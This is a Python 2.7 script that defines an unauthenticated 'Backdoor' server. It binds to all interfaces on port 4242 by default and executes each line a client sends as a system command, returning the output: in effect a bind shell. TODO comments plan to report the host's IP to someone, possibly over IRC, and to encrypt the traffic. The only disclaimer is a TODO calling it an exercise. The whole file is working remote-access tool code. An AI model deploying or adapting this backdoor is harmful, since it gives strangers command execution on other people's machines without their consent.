#!/usr/bin/env python

# developed for python 2.7

import sys
import socket
import argparse
import subprocess
import logging
from threading import Thread

# TODO write proper readme
# TODO write disclaimer, "this is an exercice, not responsible for blabla"
# TODO ping someone/somewhere and give ip info (irc ?)
# TODO encrypt communications


class Server:

    LOGGING_DFT_FORMAT = "(%(asctime)s %(levelname)s) %(message)s"
    LOGGING_LEVELS = {
        "critical": logging.CRITICAL,
        "error":    logging.ERROR,
        "warning":  logging.WARNING,
        "info":     logging.INFO,
        "debug":    logging.DEBUG
    }

    def __init__(self, backlog=5, log_level="info",
                 log_format=LOGGING_DFT_FORMAT):
        self.backlog = backlog
        logging.basicConfig(level=Server.LOGGING_LEVELS[log_level],
                            format=log_format)
        self.servsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.servsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.should_stop = True
        self.threads = []

    def run(self, port):
        self.servsocket.bind(("", port))        # bind on all interfaces
        self.servsocket.listen(self.backlog)
        self.should_stop = False

        while not self.should_stop:
            clientsocket, clientaddress = self.servsocket.accept()
            self.threads.append(Thread(target=self.handle_client,
                                       args=(clientsocket, clientaddress)))
            self.threads[-1].start()

        for thread in self.threads:
            thread.join()

    def handle_client(self, socket, address):
        pass


class Backdoor(Server):
    def handle_client(self, socket, address):
        f = socket.makefile()

        while not self.should_stop:
            line = f.readline()
            if len(line) == 0:
                break
            elif line[-1] == '\n':
                if len(line) == 1:
                    continue
                line = line[:-1]

            try:
                out = subprocess.check_output(line)
                socket.send(out)
            except Exception as e:
                socket.send(str(e))

        socket.close()
        logging.info("Connection with " + address[0] + ":" +
                     str(address[1]) + " closed")


def main():
    parser = argparse.ArgumentParser(description="zobb")
    parser.add_argument("-p", "--port", type=int, action="store", default=4242)
    parser.add_argument("--backlog", type=int, action="store", default=5)
    parser.add_argument("--log", action="store", choices=Server.LOGGING_LEVELS,
                        default="info")
    args = parser.parse_args(sys.argv[1:])

    backdoor = Backdoor(backlog=args.backlog, log_level=args.log)
    backdoor.run(args.port)


if __name__ == "__main__":
    main()
